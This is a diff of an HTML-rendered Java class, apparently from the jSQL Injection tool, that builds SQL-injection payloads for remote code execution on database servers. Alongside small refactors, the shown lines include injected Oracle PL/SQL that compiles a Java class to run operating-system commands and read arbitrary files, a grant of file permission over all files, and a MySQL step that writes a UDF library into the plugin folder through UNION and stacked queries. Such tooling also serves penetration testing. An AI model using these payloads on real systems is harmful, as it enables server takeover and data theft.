@@ -46,24 +46,24 @@
 <a class="jxr_linenumber" name="L38" href="#L38">38</a>      <strong class="jxr_keyword">private</strong> <strong class="jxr_keyword">static</strong> <strong class="jxr_keyword">final</strong> String NAME_TABLE = <span class="jxr_string">"temp"</span>;
 <a class="jxr_linenumber" name="L39" href="#L39">39</a>      <strong class="jxr_keyword">private</strong> <strong class="jxr_keyword">static</strong> <strong class="jxr_keyword">final</strong> String RCE_JAVA_UTIL_SRC = <span class="jxr_string">"RCE_JAVA_UTIL_SRC"</span>;
 <a class="jxr_linenumber" name="L40" href="#L40">40</a>      <strong class="jxr_keyword">private</strong> <strong class="jxr_keyword">static</strong> <strong class="jxr_keyword">final</strong> String RCE_JAVA_UTIL_FUNC = <span class="jxr_string">"RCE_JAVA_UTIL_FUNC"</span>;
-<a class="jxr_linenumber" name="L41" href="#L41">41</a>  
-<a class="jxr_linenumber" name="L42" href="#L42">42</a>      <strong class="jxr_keyword">private</strong> <strong class="jxr_keyword">final</strong> <a name="InjectionModel" href="../../../../com/jsql/model/InjectionModel.html#InjectionModel">InjectionModel</a> injectionModel;
-<a class="jxr_linenumber" name="L43" href="#L43">43</a>      <strong class="jxr_keyword">private</strong> <strong class="jxr_keyword">final</strong> BiPredicate&lt;String, String&gt; biPredConfirm = (String pathRemoteFolder, String nameLibraryRandom) -&gt; {
-<a class="jxr_linenumber" name="L44" href="#L44">44</a>          <strong class="jxr_keyword">try</strong> {
-<a class="jxr_linenumber" name="L45" href="#L45">45</a>              <strong class="jxr_keyword">return</strong> <strong class="jxr_keyword">this</strong>.buildSysEval(nameLibraryRandom);
-<a class="jxr_linenumber" name="L46" href="#L46">46</a>          } <strong class="jxr_keyword">catch</strong> (<a name="JSqlException" href="../../../../com/jsql/model/exception/JSqlException.html#JSqlException">JSqlException</a> e) {
-<a class="jxr_linenumber" name="L47" href="#L47">47</a>              <strong class="jxr_keyword">throw</strong> <strong class="jxr_keyword">new</strong> <a name="JSqlRuntimeException" href="../../../../com/jsql/model/exception/JSqlRuntimeException.html#JSqlRuntimeException">JSqlRuntimeException</a>(e);
-<a class="jxr_linenumber" name="L48" href="#L48">48</a>          }
-<a class="jxr_linenumber" name="L49" href="#L49">49</a>      };
-<a class="jxr_linenumber" name="L50" href="#L50">50</a>  
-<a class="jxr_linenumber" name="L51" href="#L51">51</a>      <strong class="jxr_keyword">public</strong> <a name="UdfAccess" href="../../../../com/jsql/model/accessible/UdfAccess.html#UdfAccess">UdfAccess</a>(<a name="InjectionModel" href="../../../../com/jsql/model/InjectionModel.html#InjectionModel">InjectionModel</a> injectionModel) {
-<a class="jxr_linenumber" name="L52" href="#L52">52</a>          <strong class="jxr_keyword">this</strong>.injectionModel = injectionModel;
-<a class="jxr_linenumber" name="L53" href="#L53">53</a>      }
-<a class="jxr_linenumber" name="L54" href="#L54">54</a>  
-<a class="jxr_linenumber" name="L55" href="#L55">55</a>      <strong class="jxr_keyword">public</strong> <strong class="jxr_keyword">void</strong> createExploitRce(<a name="ExploitMethod" href="../../../../com/jsql/model/accessible/ExploitMethod.html#ExploitMethod">ExploitMethod</a> exploitMethod) <strong class="jxr_keyword">throws</strong> <a name="JSqlException" href="../../../../com/jsql/model/exception/JSqlException.html#JSqlException">JSqlException</a> {
-<a class="jxr_linenumber" name="L56" href="#L56">56</a>          <strong class="jxr_keyword">if</strong> (!Arrays.asList(ExploitMethod.AUTO, ExploitMethod.QUERY_BODY).contains(exploitMethod)) {
-<a class="jxr_linenumber" name="L57" href="#L57">57</a>              LOGGER.log(LogLevelUtil.CONSOLE_ERROR, <span class="jxr_string">"Exploit method not implemented, use query body instead"</span>);
-<a class="jxr_linenumber" name="L58" href="#L58">58</a>              <strong class="jxr_keyword">return</strong>;
+<a class="jxr_linenumber" name="L41" href="#L41">41</a>      <strong class="jxr_keyword">private</strong> <strong class="jxr_keyword">static</strong> <strong class="jxr_keyword">final</strong> String BEGIN = <span class="jxr_string">"BEGIN"</span>;
+<a class="jxr_linenumber" name="L42" href="#L42">42</a>  
+<a class="jxr_linenumber" name="L43" href="#L43">43</a>      <strong class="jxr_keyword">private</strong> <strong class="jxr_keyword">final</strong> <a name="InjectionModel" href="../../../../com/jsql/model/InjectionModel.html#InjectionModel">InjectionModel</a> injectionModel;
+<a class="jxr_linenumber" name="L44" href="#L44">44</a>      <strong class="jxr_keyword">private</strong> <strong class="jxr_keyword">final</strong> BiPredicate&lt;String, String&gt; biPredConfirm = (String pathRemoteFolder, String nameLibraryRandom) -&gt; {
+<a class="jxr_linenumber" name="L45" href="#L45">45</a>          <strong class="jxr_keyword">try</strong> {
+<a class="jxr_linenumber" name="L46" href="#L46">46</a>              <strong class="jxr_keyword">return</strong> <strong class="jxr_keyword">this</strong>.buildSysEval(nameLibraryRandom);
+<a class="jxr_linenumber" name="L47" href="#L47">47</a>          } <strong class="jxr_keyword">catch</strong> (<a name="JSqlException" href="../../../../com/jsql/model/exception/JSqlException.html#JSqlException">JSqlException</a> e) {
+<a class="jxr_linenumber" name="L48" href="#L48">48</a>              <strong class="jxr_keyword">throw</strong> <strong class="jxr_keyword">new</strong> <a name="JSqlRuntimeException" href="../../../../com/jsql/model/exception/JSqlRuntimeException.html#JSqlRuntimeException">JSqlRuntimeException</a>(e);
+<a class="jxr_linenumber" name="L49" href="#L49">49</a>          }
+<a class="jxr_linenumber" name="L50" href="#L50">50</a>      };
+<a class="jxr_linenumber" name="L51" href="#L51">51</a>  
+<a class="jxr_linenumber" name="L52" href="#L52">52</a>      <strong class="jxr_keyword">public</strong> <a name="UdfAccess" href="../../../../com/jsql/model/accessible/UdfAccess.html#UdfAccess">UdfAccess</a>(<a name="InjectionModel" href="../../../../com/jsql/model/InjectionModel.html#InjectionModel">InjectionModel</a> injectionModel) {
+<a class="jxr_linenumber" name="L53" href="#L53">53</a>          <strong class="jxr_keyword">this</strong>.injectionModel = injectionModel;
+<a class="jxr_linenumber" name="L54" href="#L54">54</a>      }
+<a class="jxr_linenumber" name="L55" href="#L55">55</a>  
+<a class="jxr_linenumber" name="L56" href="#L56">56</a>      <strong class="jxr_keyword">public</strong> <strong class="jxr_keyword">void</strong> createExploitRce(<a name="ExploitMethod" href="../../../../com/jsql/model/accessible/ExploitMethod.html#ExploitMethod">ExploitMethod</a> exploitMethod) <strong class="jxr_keyword">throws</strong> <a name="JSqlException" href="../../../../com/jsql/model/exception/JSqlException.html#JSqlException">JSqlException</a> {
+<a class="jxr_linenumber" name="L57" href="#L57">57</a>          <strong class="jxr_keyword">if</strong> (!Arrays.asList(ExploitMethod.AUTO, ExploitMethod.QUERY_BODY).contains(exploitMethod)) {
+<a class="jxr_linenumber" name="L58" href="#L58">58</a>              LOGGER.log(LogLevelUtil.CONSOLE_INFORM, <span class="jxr_string">"Exploit method not implemented, using query body instead"</span>);
 <a class="jxr_linenumber" name="L59" href="#L59">59</a>          }
 <a class="jxr_linenumber" name="L60" href="#L60">60</a>  
 <a class="jxr_linenumber" name="L61" href="#L61">61</a>          <strong class="jxr_keyword">var</strong> pattern = <span class="jxr_string">" ; drop java source \&quot;%s\&quot;;"</span>;
@@ -72,16 +72,16 @@
 <a class="jxr_linenumber" name="L64" href="#L64">64</a>          <strong class="jxr_keyword">this</strong>.injectionModel.injectWithoutIndex(String.format(pattern, UdfAccess.RCE_JAVA_UTIL_FUNC), <span class="jxr_string">"body#drop-src"</span>);
 <a class="jxr_linenumber" name="L65" href="#L65">65</a>          pattern = <span class="jxr_string">" ; %s "</span>;
 <a class="jxr_linenumber" name="L66" href="#L66">66</a>          <strong class="jxr_keyword">this</strong>.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
-<a class="jxr_linenumber" name="L67" href="#L67">67</a>              <span class="jxr_string">"BEGIN"</span>,
+<a class="jxr_linenumber" name="L67" href="#L67">67</a>              UdfAccess.BEGIN,
 <a class="jxr_linenumber" name="L68" href="#L68">68</a>              <span class="jxr_string">"&#92;&#92;n"</span>,
 <a class="jxr_linenumber" name="L69" href="#L69">69</a>              <span class="jxr_string">"EXECUTE IMMEDIATE 'create or replace and compile java source named \&quot;"</span>,
-<a class="jxr_linenumber" name="L70" href="#L70">70</a>              UdfAccess.RCE_JAVA_UTIL_SRC, <span class="jxr_string">"_SRC"</span>,
-<a class="jxr_linenumber" name="L71" href="#L71">71</a>              <span class="jxr_string">"\&quot; as import java.io.*; public class "</span>, UdfAccess.RCE_JAVA_UTIL_SRC, <span class="jxr_string">"_SRC{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \&quot;\&quot;;while ((stemp = myReader.readLine()) != null) str %2B= stemp %2B \&quot;&#92;&#92;&#92;&#92;n\&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \&quot;\&quot;;while((stemp = myReader.readLine()) != null) str %2B= stemp %2B \&quot;&#92;&#92;&#92;&#92;n\&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}}};';"</span>,
+<a class="jxr_linenumber" name="L70" href="#L70">70</a>              UdfAccess.RCE_JAVA_UTIL_SRC,
+<a class="jxr_linenumber" name="L71" href="#L71">71</a>              <span class="jxr_string">"\&quot; as import java.io.*; public class "</span>, UdfAccess.RCE_JAVA_UTIL_SRC, <span class="jxr_string">"{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \&quot;\&quot;;while ((stemp = myReader.readLine()) != null) str %2B= stemp %2B \&quot;&#92;&#92;&#92;&#92;n\&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \&quot;\&quot;;while((stemp = myReader.readLine()) != null) str %2B= stemp %2B \&quot;&#92;&#92;&#92;&#92;n\&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}}};';"</span>,
 <a class="jxr_linenumber" name="L72" href="#L72">72</a>              <span class="jxr_string">"&#92;&#92;n"</span>,
 <a class="jxr_linenumber" name="L73" href="#L73">73</a>              <span class="jxr_string">"END;"</span>
 <a class="jxr_linenumber" name="L74" href="#L74">74</a>          )), <span class="jxr_string">"body#create-src"</span>);
 <a class="jxr_linenumber" name="L75" href="#L75">75</a>          <strong class="jxr_keyword">this</strong>.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
-<a class="jxr_linenumber" name="L76" href="#L76">76</a>              <span class="jxr_string">"BEGIN"</span>,
+<a class="jxr_linenumber" name="L76" href="#L76">76</a>              UdfAccess.BEGIN,
 <a class="jxr_linenumber" name="L77" href="#L77">77</a>              <span class="jxr_string">"&#92;&#92;n"</span>,
 <a class="jxr_linenumber" name="L78" href="#L78">78</a>              <span class="jxr_string">"EXECUTE IMMEDIATE 'create or replace function "</span>,
 <a class="jxr_linenumber" name="L79" href="#L79">79</a>              UdfAccess.RCE_JAVA_UTIL_FUNC,
@@ -92,7 +92,7 @@
 <a class="jxr_linenumber" name="L84" href="#L84">84</a>              <span class="jxr_string">"END;"</span>
 <a class="jxr_linenumber" name="L85" href="#L85">85</a>          )), <span class="jxr_string">"body#create-func"</span>);
 <a class="jxr_linenumber" name="L86" href="#L86">86</a>          <strong class="jxr_keyword">this</strong>.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
-<a class="jxr_linenumber" name="L87" href="#L87">87</a>              <span class="jxr_string">"BEGIN"</span>,
+<a class="jxr_linenumber" name="L87" href="#L87">87</a>              UdfAccess.BEGIN,
 <a class="jxr_linenumber" name="L88" href="#L88">88</a>              <span class="jxr_string">"&#92;&#92;n"</span>,
 <a class="jxr_linenumber" name="L89" href="#L89">89</a>              <span class="jxr_string">"dbms_java.grant_permission('SYSTEM', 'SYS:java.io.FilePermission', '&lt;&lt;ALL FILES&gt;&gt;', 'execute');"</span>,
 <a class="jxr_linenumber" name="L90" href="#L90">90</a>              <span class="jxr_string">"&#92;&#92;n"</span>,
@@ -123,7 +123,7 @@
 <a class="jxr_linenumber" name="L115" href="#L115">115</a>             <strong class="jxr_keyword">return</strong>;
 <a class="jxr_linenumber" name="L116" href="#L116">116</a>         }
 <a class="jxr_linenumber" name="L117" href="#L117">117</a> 
-<a class="jxr_linenumber" name="L118" href="#L118">118</a>         <strong class="jxr_keyword">var</strong> nbIndexesFound = <strong class="jxr_keyword">this</strong>.injectionModel.getMediatorStrategy().getSpecificNormal().getNbIndexesFound() - 1;
+<a class="jxr_linenumber" name="L118" href="#L118">118</a>         <strong class="jxr_keyword">var</strong> nbIndexesFound = <strong class="jxr_keyword">this</strong>.injectionModel.getMediatorStrategy().getSpecificUnion().getNbIndexesFound() - 1;
 <a class="jxr_linenumber" name="L119" href="#L119">119</a>         <strong class="jxr_keyword">var</strong> pathPlugin = <strong class="jxr_keyword">this</strong>.getResult(<span class="jxr_string">"select@@plugin_dir"</span>, <span class="jxr_string">"udf#dir"</span>);
 <a class="jxr_linenumber" name="L120" href="#L120">120</a>         <strong class="jxr_keyword">if</strong> (StringUtils.isEmpty(pathPlugin)) {
 <a class="jxr_linenumber" name="L121" href="#L121">121</a>             <strong class="jxr_keyword">throw</strong> <strong class="jxr_keyword">new</strong> <a name="JSqlException" href="../../../../com/jsql/model/exception/JSqlException.html#JSqlException">JSqlException</a>(<span class="jxr_string">"Incorrect plugin folder: path is empty"</span>);
@@ -196,7 +196,7 @@
 <a class="jxr_linenumber" name="L188" href="#L188">188</a>         <strong class="jxr_keyword">this</strong>.injectionModel.injectWithoutIndex(String.format(pattern,
 <a class="jxr_linenumber" name="L189" href="#L189">189</a>             <span class="jxr_string">"union"</span>,
 <a class="jxr_linenumber" name="L190" href="#L190">190</a>             <span class="jxr_string">"'',"</span>.repeat(nbIndexesFound),
-<a class="jxr_linenumber" name="L191" href="#L191">191</a>             String.join(<span class="jxr_string">""</span>, hexChunks),
+<a class="jxr_linenumber" name="L191" href="#L191">191</a>             String.join(StringUtils.EMPTY, hexChunks),
 <a class="jxr_linenumber" name="L192" href="#L192">192</a>             pathRemoteFolder + nameExploitRandom
 <a class="jxr_linenumber" name="L193" href="#L193">193</a>         ), <span class="jxr_string">"body#union-dump"</span>);
 <a class="jxr_linenumber" name="L194" href="#L194">194</a>         <strong class="jxr_keyword">if</strong> (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
@@ -208,7 +208,7 @@
 <a class="jxr_linenumber" name="L200" href="#L200">200</a>             <strong class="jxr_keyword">this</strong>.injectionModel.injectWithoutIndex(String.format(pattern,
 <a class="jxr_linenumber" name="L201" href="#L201">201</a>                 <span class="jxr_string">";"</span>,
 <a class="jxr_linenumber" name="L202" href="#L202">202</a>                 StringUtils.EMPTY,
-<a class="jxr_linenumber" name="L203" href="#L203">203</a>                 String.join(<span class="jxr_string">""</span>, hexChunks),
+<a class="jxr_linenumber" name="L203" href="#L203">203</a>                 String.join(StringUtils.EMPTY, hexChunks),
 <a class="jxr_linenumber" name="L204" href="#L204">204</a>                 pathRemoteFolder + nameExploitRandom
 <a class="jxr_linenumber" name="L205" href="#L205">205</a>             ), <span class="jxr_string">"body#stack-dump"</span>);
 <a class="jxr_linenumber" name="L206" href="#L206">206</a>             <strong class="jxr_keyword">if</strong> (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
@@ -381,7 +381,7 @@
 <a class="jxr_linenumber" name="L373" href="#L373">373</a>         }
 <a class="jxr_linenumber" name="L374" href="#L374">374</a>     }
 <a class="jxr_linenumber" name="L375" href="#L375">375</a> 
-<a class="jxr_linenumber" name="L376" href="#L376">376</a>     <strong class="jxr_keyword">private</strong> String getResult(String query, String metadata) <strong class="jxr_keyword">throws</strong> <a name="JSqlException" href="../../../../com/jsql/model/exception/JSqlException.html#JSqlException">JSqlException</a> {
+<a class="jxr_linenumber" name="L376" href="#L376">376</a>     <strong class="jxr_keyword">public</strong> String getResult(String query, String metadata) <strong class="jxr_keyword">throws</strong> <a name="JSqlException" href="../../../../com/jsql/model/exception/JSqlException.html#JSqlException">JSqlException</a> {
 <a class="jxr_linenumber" name="L377" href="#L377">377</a>         <strong class="jxr_keyword">var</strong> sourcePage = <strong class="jxr_keyword">new</strong> String[]{ StringUtils.EMPTY };
 <a class="jxr_linenumber" name="L378" href="#L378">378</a>         <strong class="jxr_keyword">return</strong> <strong class="jxr_keyword">new</strong> <a name="SuspendableGetRows" href="../../../../com/jsql/model/suspendable/SuspendableGetRows.html#SuspendableGetRows">SuspendableGetRows</a>(<strong class="jxr_keyword">this</strong>.injectionModel).run(
 <a class="jxr_linenumber" name="L379" href="#L379">379</a>             query,
